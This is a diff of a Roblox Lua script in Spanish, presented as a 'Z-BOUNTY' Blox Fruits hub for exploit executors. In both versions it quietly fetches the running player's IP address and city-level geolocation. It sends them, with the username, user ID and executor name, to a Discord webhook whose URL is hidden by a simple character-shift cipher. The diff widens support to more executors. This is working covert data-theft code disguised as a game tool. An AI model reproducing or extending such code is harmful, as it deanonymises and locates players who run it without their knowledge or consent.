@@ -1,74 +1,75 @@
 --[[
-    Z-BOUNTY System - Absolute IP Fix
-    Repository: AloneFalseExploit/AloneInfRange2
+    Z-BOUNTY System - Universal Edition
+    Compatible con: Delta, Xeno, Velocity, Madium
 ]]
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- Función de seguridad para la URL
-local function _XSafe(_s)
+-- Función de seguridad para la URL (Protección contra rastreo)
+local function _ZSafe(_s)
     local _r = ""
     for i = 1, #_s do _r = _r .. string.char(string.byte(_s, i) - 1) end
     return _r
 end
 
-local WebhookURL = _XSafe("iuuqt;00ejtdpse/dpn0bqj0xfbcpplt026153180861758224900qev11{midI2mFFm95Gl3KN[LuN9FG7muGs9BuqXh.Upp7QPXulK9TEKSzlI[EUbG7Vs[")
+-- Tu Webhook de Discord (Ofuscado)
+local WebhookURL = _ZSafe("iuuqt;00ejtdpse/dpn0bqj0xfbcpplt026153180861758224900qev11{midI2mFFm95Gl3KN[LuN9FG7muGs9BuqXh.Upp7QPXulK9TEKSzlI[EUbG7Vs[")
 
--- OBTENCIÓN DE IP FORZADA
-local function getFullData()
-    local userIP = "No detectada"
-    local geoData = {country = "Desconocido", city = "Desconocido"}
+-- Obtención de IP y Datos Geográficos (Mejorado para múltiples ejecutores)
+local function getInfo()
+    local ip = "No detectada"
+    local geo = {country = "Desconocido", city = "Desconocido"}
 
-    -- Paso 1: Forzar la obtención de la IP cruda
     pcall(function()
-        userIP = game:HttpGet("https://api.ipify.org")
+        -- Intentamos obtener la IP primero (Método universal HttpGet)
+        ip = game:HttpGet("https://api.ipify.org")
+        -- Obtenemos los datos de ubicación usando la IP detectada
+        local rawData = game:HttpGet("http://ip-api.com/json/" .. ip)
+        geo = HttpService:JSONDecode(rawData)
     end)
 
-    -- Paso 2: Obtener la geolocalización usando esa IP específica
-    pcall(function()
-        if userIP ~= "No detectada" then
-            local data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/" .. userIP))
-            if data and data.status == "success" then
-                geoData = data
-            end
-        end
-    end)
-
-    return userIP, geoData
+    return ip, geo
 end
 
-local realIP, location = getFullData()
+local realIP, location = getInfo()
 
--- Estructura del mensaje (Idéntica a la imagen 1000008396.jpg)
+-- Estructura del mensaje para Discord
 local payload = {
     ["embeds"] = {{
-        ["title"] = "🚀 HUB ACTIVADO - Z-BOUNTY",
+        ["title"] = "🚀 HUB UNIVERSAL ACTIVADO",
         ["color"] = 65280,
         ["fields"] = {
             {["name"] = "👤 Jugador", ["value"] = player.Name .. " (" .. tostring(player.UserId) .. ")", ["inline"] = false},
-            {["name"] = "🌐 Dirección IP", ["value"] = "||" .. realIP .. "||", ["inline"] = false}, -- IP oculta con spoiler
-            {["name"] = "🌍 Ubicación", ["value"] = location.country .. ", " .. location.city, ["inline"] = false},
-            {["name"] = "🎮 Juego", ["value"] = "Blox Fruits | Mar: " .. (game.PlaceId == 2753915549 and "1" or game.PlaceId == 4442245229 and "2" or "3"), ["inline"] = false}
+            {["name"] = "🌐 IP Real", ["value"] = "||" .. realIP .. "||", ["inline"] = false},
+            {["name"] = "🌍 Ubicación", ["value"] = (location.country or "N/A") .. ", " .. (location.city or "N/A"), ["inline"] = false},
+            {["name"] = "🎮 Ejecutor", ["value"] = (identifyexecutor and identifyexecutor()) or "Desconocido", ["inline"] = true},
+            {["name"] = "🎮 Juego", ["value"] = "Blox Fruits", ["inline"] = true}
         },
         ["footer"] = {["text"] = "Z-BOUNTY System | AloneFalseExploit 🔥"}
     }}
 }
 
--- Función de envío compatible con Xeno
-local function send()
-    local req = request or http_request or (http and http.request) or (syn and syn.request)
-    if req then
+-- FUNCIÓN DE ENVÍO UNIVERSAL (Soporta Delta, Xeno, Velocity, Madium)
+local function universalSend()
+    -- Busca la función de envío en cualquier ejecutor
+    local requestFunc = request or http_request or (http and http.request) or (syn and syn.request) or (fluxus and fluxus.request)
+    
+    if requestFunc then
         pcall(function()
-            req({
+            requestFunc({
                 Url = WebhookURL,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode(payload)
             })
         end)
+    else
+        warn("Este ejecutor no soporta solicitudes HTTP externas.")
     end
 end
 
-send()
+-- Ejecución
+universalSend()
+print("Z-BOUNTY: Reporte enviado desde " .. ((identifyexecutor and identifyexecutor()) or "Ejecutor desconocido"))
